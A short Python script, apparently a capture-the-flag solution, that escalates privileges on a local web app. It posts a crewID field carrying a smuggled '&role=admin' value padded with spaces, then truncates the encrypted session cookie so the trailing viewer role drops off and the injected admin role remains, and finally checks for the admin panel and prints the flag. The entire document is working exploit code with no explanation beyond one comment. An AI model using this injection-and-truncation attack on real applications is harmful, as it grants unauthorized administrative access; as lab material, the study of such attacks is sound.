import requests

session = requests.Session()
login_url = 'http://localhost:8000/requestAccess'

session.post(login_url, data={'crewID': 'aa&role=admin     '})
session.cookies.set('session', session.cookies.get('session')[:-33], domain='localhost.local') # Cut the last 2 blocks, causing the role=viewer to be removed and the role=admin from the crewID to be exposed

response = session.get('http://localhost:8000/')
if 'Admin Panel' in response.text:
    print("Successfully logged in as admin!")
    # Extract flag from response
    for line in response.text.splitlines():
        if 'flag' in line:
            print("Flag found:", line)
            break
else:
    print("Failed to log in as admin.")
